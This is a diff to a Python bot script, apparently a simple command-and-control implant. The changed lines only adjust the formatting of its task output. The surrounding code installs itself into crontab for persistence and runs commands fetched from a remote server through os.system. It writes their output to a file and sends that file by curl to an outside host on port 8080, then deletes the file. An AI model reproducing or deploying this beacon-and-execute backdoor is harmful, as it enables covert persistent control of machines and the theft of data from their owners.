@@ -8,7 +8,7 @@ import time
 
 # Cronjob functions that set up bot to run 
 # automatically each day and periodically beacon for instructions.
-##whoami variable ensures that the program will always know where it is  
+#whoami variable ensures that the program will always know where it is  
 def cronjobs():
 	whoami = os.getcwd()+"/charlex.py"
 	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+' >/dev/null 2>&1") | crontab -'
@@ -65,6 +65,8 @@ def instructions():
 	os.system(header)
 	with open('response.txt') as input_file:
 		send = 0
+		linebreak = '='*70
+		end = '*' * 70
 		for line in input_file:
 			commands = line.split()
 			mycommand = ''
@@ -74,14 +76,16 @@ def instructions():
 					mycommand += thing
 					mycommand += ' '
 				servecommand = mycommand.split('>>')[0]
-				taskwrap = "echo 'From Task: "+servecommand+"' >>sendthis.txt"
+				taskwrap = "echo '"+linebreak+"\nFrom Task: "+servecommand+"\n' >>sendthis.txt"
 				os.system(taskwrap)
 				os.system(mycommand)
 		if send == 1:
-			os.system("echo 'End Tasks' >> sendthis.txt")
+			lasttask = "echo '"+end+"\nEnd of Tasks\n'"+end+" >>sendthis.txt"
+			os.system(lasttask)
 			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
 		elif send == 0:
-			os.system("echo 'Status is Online' >> sendthis.txt")
+			online = "echo '"+end+"\nStatus is Online\n"+end+"' >> sendthis.txt"
+			os.system(online)
 			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/logs.txt')
 	os.system('rm sendthis.txt response.txt')
 
